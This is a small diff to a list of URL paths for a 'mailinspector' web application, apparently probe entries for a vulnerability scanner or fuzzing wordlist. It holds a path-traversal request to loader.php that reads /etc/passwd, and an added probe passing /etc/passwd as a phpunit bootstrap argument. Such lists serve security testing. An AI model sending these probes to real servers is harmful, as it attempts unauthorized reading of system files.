@@ -1,2 +1,4 @@
 /mailinspector/login.php
 /mailinspector/public/loader.php?path=../../../../../../../etc/passwd
+/mailinspector
+/mailinspector/vendor/phpunit/phpunit.php?--bootstrap=/etc/passwd
